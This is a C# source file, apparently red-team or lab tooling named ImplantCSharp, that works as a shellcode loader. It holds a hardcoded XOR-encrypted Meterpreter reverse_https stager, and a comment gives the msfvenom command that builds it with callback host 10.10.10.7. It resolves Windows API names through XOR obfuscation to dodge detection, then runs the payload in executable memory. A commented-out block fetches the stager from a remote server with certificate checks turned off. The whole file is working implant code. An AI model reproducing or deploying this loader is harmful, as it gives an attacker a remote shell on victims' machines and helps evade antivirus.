using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Http;
using System.Reflection.Emit;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using static ImplantCSharp.Win32;

namespace ImplantCSharp
{
    internal class Program
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate IntPtr WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void WindowsRun();
        static void Main(string[] args)
        {
			//xored msfvenom -p windows/x64/meterpreter/reverse_https lhost=10.10.10.7 lport=443 -f raw -e x64/zutto_dekiru -o encrypted_staged_met.bin
            //hardcoded stager
            byte[] material = { 0x3f, 0x34, 0x33, 0x2b, 0x58, 0xb8, 0x9, 0x33, 0xea, 0x90, 0x4e, 0x9b, 0x20, 0xc2, 0x80, 0x27, 0xf6, 0x19, 0x29, 0x7, 0xe2, 0x93, 0xb6, 0x9f, 0x22, 0x7a, 0xc0, 0x26, 0x69, 0xc8, 0x26, 0x3f, 0xe0, 0x8, 0x66, 0x2b, 0x96, 0xb0, 0x22, 0x43, 0x3f, 0xb2, 0x74, 0x2b, 0xec, 0xb8, 0x1a, 0x81, 0x78, 0x68, 0x70, 0xeb, 0xde, 0xf4, 0x28, 0x99, 0x84, 0x20, 0xb2, 0x5e, 0x6f, 0x4c, 0xb6, 0xc8, 0xd2, 0x68, 0xc2, 0xdd, 0x4b, 0x54, 0x6f, 0xcb, 0xe4, 0x68, 0x78, 0x5d, 0x36, 0x54, 0x6f, 0xcb, 0xa4, 0x68, 0xfc, 0xb8, 0x64, 0x56, 0xac, 0x12, 0xf6, 0x70, 0xbe, 0x3e, 0xe7, 0x54, 0xd5, 0x59, 0x28, 0x1c, 0x92, 0x73, 0x2c, 0x30, 0xc4, 0xd8, 0x45, 0xe9, 0xfe, 0x4e, 0x2f, 0xdd, 0x6, 0x74, 0xd6, 0x61, 0xa2, 0x47, 0xa5, 0x4e, 0xc4, 0x12, 0xc6, 0x1c, 0xbb, 0xe, 0xfe, 0x7a, 0x65, 0xe1, 0x9c, 0x2b, 0xf1, 0x0, 0xab, 0x6e, 0xe4, 0x99, 0x84, 0xab, 0x73, 0x87, 0x2e, 0x1c, 0xe4, 0xd1, 0x1, 0xe0, 0x87, 0x68, 0x66, 0x1d, 0x34, 0xdd, 0xf, 0x60, 0xd3, 0x46, 0x2f, 0xcc, 0xb4, 0x12, 0xcc, 0x38, 0x10, 0x59, 0x63, 0x2d, 0x2d, 0xd1, 0x7b, 0xe9, 0xb2, 0x84, 0x1a, 0x94, 0xac, 0x98, 0x52, 0x68, 0xc2, 0xcf, 0x82, 0x5d, 0x25, 0x50, 0x89, 0x61, 0xf2, 0xce, 0x16, 0xfc, 0x91, 0x68, 0xc8, 0x23, 0xbf, 0x2b, 0x26, 0x59, 0xdd, 0x48, 0xf1, 0xf8, 0xab, 0x4b, 0xa5, 0x5c, 0xc0, 0xd0, 0x85, 0xf0, 0x95, 0x4e, 0xa5, 0x10, 0xac, 0xdd, 0xf, 0x60, 0xef, 0x46, 0x2f, 0xcc, 0xa5, 0x12, 0x80, 0xa8, 0xbb, 0xe, 0xfe, 0x5d, 0xbc, 0xd8, 0xdc, 0x7e, 0xaa, 0x55, 0x6f, 0x44, 0xa5, 0xc0, 0xc5, 0x7a, 0xbb, 0x8c, 0xc2, 0x3c, 0xa5, 0xcb, 0x7b, 0xc0, 0xab, 0x4e, 0x77, 0x46, 0xac, 0x12, 0x96, 0xc9, 0xb8, 0xf0, 0xd1, 0xe3, 0xb9, 0xd1, 0xb5, 0xfb, 0xa0, 0x46, 0x90, 0x6b, 0x8d, 0xf7, 0xed, 0x4e, 0x96, 0x7b, 0x2e, 0x5d, 0xb2, 0xd1, 0xd, 0xc1, 0xba, 0xc8, 0xec, 0x50, 0x93, 0xbf, 0x83, 0xdf, 0x26, 0x5c, 0x7d, 0x54, 0x6d, 0x78, 0xd7, 0x7a, 0xbe, 0x3e, 0xee, 0x51, 0xd5, 0x50, 0xd7, 0x73, 0xba, 0xb5, 0x14, 0x4a, 0x9d, 0x3e, 0x84, 0x20, 0xf3, 0xf, 0xd1, 0xc9, 0xc, 0x92, 0x84, 0x20, 0xf3, 0x3e, 0x1e, 0x32, 0xd5, 0xa9, 0xaa, 0x11, 0xc3, 0x21, 0x19, 0x1c, 0xbe, 0xd1, 0xd, 0xe1, 0xba, 0xc8, 0xee, 0xa7, 0xe5, 0x99, 0x84, 0x6d, 0xc2, 0xc6, 0x7d, 0x4f, 0x8e, 0x9a, 0xd7, 0x69, 0x49, 0x58, 0xa7, 0x83, 0x22, 0x99, 0x84, 0x20, 0xf3, 0xf0, 0xfb, 0xf4, 0xc5, 0x99, 0x84, 0x20, 0xdc, 0x5e, 0x3, 0x69, 0xbe, 0xdc, 0xec, 0x7a, 0x99, 0x4d, 0x6b, 0x2c, 0xa7, 0xe1, 0xd5, 0x70, 0xbb, 0x56, 0x78, 0x75, 0xb2, 0xea, 0xc5, 0x56, 0x87, 0x3b, 0x1b, 0x65, 0x82, 0xfd, 0xb0, 0x77, 0xf3, 0x47, 0xa7, 0xdd, 0xb7, 0xc3, 0xc5, 0x78, 0xbe, 0x3e, 0xe7, 0x4f, 0xac, 0x21, 0x84, 0x12, 0x5b, 0x8b, 0x2e, 0x1c, 0xe4, 0x99, 0xd4, 0x73, 0xa0, 0x46, 0xe9, 0xde, 0xf, 0xcc, 0xaa, 0x1b, 0xc, 0xda, 0x66, 0x95, 0x22, 0xf3, 0x8e, 0x7f, 0xbb, 0x86, 0xdf, 0x76, 0xfb, 0xc3, 0xd6, 0x48, 0x73, 0x3c, 0x2e, 0x1c, 0xad, 0x10, 0x64, 0x4a, 0xf7, 0x4e, 0x77, 0x55, 0x5e, 0xec, 0xc2, 0xbe, 0x75, 0xf, 0x2e, 0x1c, 0xe4, 0x66, 0x51, 0x6d, 0xc2, 0xcf, 0x7d, 0x46, 0xac, 0x10, 0x75, 0x6d, 0xc2, 0xc6, 0x63, 0x2d, 0x2d, 0xca, 0xd7, 0x69, 0x34, 0xcd, 0x3, 0x1a, 0xfc, 0xe2, 0x7b, 0xf5, 0x76, 0xcf, 0x5b, 0x3, 0xac, 0x5e, 0x45, 0xa8, 0xe0, 0xf, 0x2e, 0x55, 0x5e, 0xdd, 0x74, 0x15, 0x13, 0xf, 0x2e, 0x1c, 0xe4, 0x66, 0x51, 0x68, 0xc, 0xc0, 0x5a, 0x1e, 0xf, 0x33, 0x6c, 0x75, 0xf3, 0xf, 0x2e, 0x4f, 0xbd, 0xf3, 0xc4, 0x7a, 0xba, 0x86, 0xff, 0xdd, 0x6, 0x89, 0xcd, 0xe7, 0x33, 0xf, 0x3e, 0x1c, 0xe4, 0xd0, 0x3e, 0x78, 0x57, 0x5c, 0xcb, 0x1c, 0xe4, 0x99, 0x84, 0xdf, 0x26, 0x47, 0xbd, 0x4f, 0xb7, 0xd1, 0xd, 0xc7, 0xbb, 0x86, 0xdf, 0x54, 0x6d, 0x43, 0xcd, 0xe7, 0x33, 0xf, 0xe, 0x1c, 0xe4, 0xd0, 0xd, 0xd9, 0xba, 0xb5, 0x3c, 0x8a, 0x6d, 0x7b, 0x84, 0x20, 0xf3, 0xf, 0xd1, 0xc9, 0xac, 0x1a, 0x40, 0x0, 0x76, 0xcf, 0x5a, 0xae, 0x82, 0x12, 0x83, 0x68, 0xf2, 0xcc, 0xab, 0xdc, 0x91, 0x4b, 0xdc, 0xe3, 0xab, 0x65, 0x2e, 0x45, 0xad, 0x5e, 0x46, 0xd0, 0x46, 0xad, 0x78, 0xe3, 0x31, 0xd0 };
            byte[] decryptedMaterial;

            //fetch stager from the webserver
            /***
            using (var handler = new HttpClientHandler())
            {
                handler.ServerCertificateCustomValidationCallback = (message, cert, chain, sslPolicyErrors) => true;

                using (var client = new HttpClient(handler))
                {
                    material = await client.GetByteArrayAsync("http://10.10.10.7/met.bin");
                }
            }
            ***/

            byte[] vA = { 0x3d, 0x1c, 0x1c, 0x17, 0x1c, 0x19, 0x3, 0x33, 0x7, 0x19, 0x1, 0x0 };
            byte[] cRT = { 0x28, 0x7, 0xb, 0x2, 0x1d, 0x1d, 0x3b, 0x1a, 0x19, 0x10, 0xf, 0x7 };
            byte[] wFS = { 0x3c, 0x14, 0x7, 0x17, 0x2f, 0x17, 0x1d, 0x21, 0x2, 0x1b, 0x9, 0xf, 0xc, 0x37, 0xd, 0x18, 0xe, 0x16, 0x1a };
            //byte[] vP = { 0x3d, 0x1c, 0x1c, 0x17, 0x1c, 0x19, 0x3, 0x22, 0x19, 0x1a, 0x1a, 0x6, 0xa, 0xc };

            //convert xor decrypted byte it to string
            string virtualalloc = Encoding.ASCII.GetString(eksorByte(vA)); 
            string createthread = Encoding.ASCII.GetString(eksorByte(cRT));
            string waitforsingleobject = Encoding.ASCII.GetString(eksorByte(wFS));
            //string virtualprotect = Encoding.ASCII.GetString(eksorByte(vP));
            decryptedMaterial = eksorByte(material);

            //lookup function in process
            IntPtr pVirtualAlloc = Win32.GetProcAddress(Win32.GetModuleHandle("kernel32.dll"), virtualalloc);
            IntPtr pWaitForSingleObject = Win32.GetProcAddress(Win32.GetModuleHandle("kernel32.dll"), waitforsingleobject);
            IntPtr pCreateThread = Win32.GetProcAddress(Win32.GetModuleHandle("kernel32.dll"), createthread);
            //IntPtr pVirtualProtect = Win32.GetProcAddress(Win32.GetModuleHandle("kernel32.dll"), virtualprotect);

            //get function pointer in process
            VirtualAlloc fVA = (VirtualAlloc)Marshal.GetDelegateForFunctionPointer(pVirtualAlloc, typeof(VirtualAlloc));
            WaitForSingleObject fWFS = (WaitForSingleObject)Marshal.GetDelegateForFunctionPointer(pWaitForSingleObject, typeof(WaitForSingleObject));
            CreateThread fcRT = (CreateThread)Marshal.GetDelegateForFunctionPointer(pCreateThread, typeof(CreateThread));
            //VirtualProtect fVP = (VirtualProtect)Marshal.GetDelegateForFunctionPointer(pVirtualProtect, typeof(VirtualProtect));

            //injection routine
            var baseAddress = fVA(IntPtr.Zero, (uint)decryptedMaterial.Length, Win32.AllocationType.Commit | Win32.AllocationType.Reserve, Win32.MemoryProtection.ExecuteReadWrite);
            Marshal.Copy(decryptedMaterial, 0, baseAddress, decryptedMaterial.Length);
            //fVP(baseAddress, (uint)material.Length, 0x20, out _);
            //Win32.VirtualProtect(baseAddress, (uint)material.Length, 0x20, out _);
            //WindowsRun r = (WindowsRun)Marshal.GetDelegateForFunctionPointer(baseAddress, typeof(WindowsRun));
            //r();
            var hThread = fcRT(IntPtr.Zero, 0, baseAddress, IntPtr.Zero, 0, IntPtr.Zero);
            fWFS(hThread, 0xFFFFFFFF);
        }

        // Return xor decrypted byte
        static byte[] eksorByte(byte[] encryptName)
        {
            int j = 0;
            string kunci = "kuncixor";
            int kuncilength = kunci.Length;
            byte[] decryptName = new byte[encryptName.Length];
            for (int i = 0; i < encryptName.Length; i++)
            {
                decryptName[i] = (byte)((uint)encryptName[i] ^ (uint)kunci[i % kuncilength]);
            }
            return decryptName;
        }
    }
}
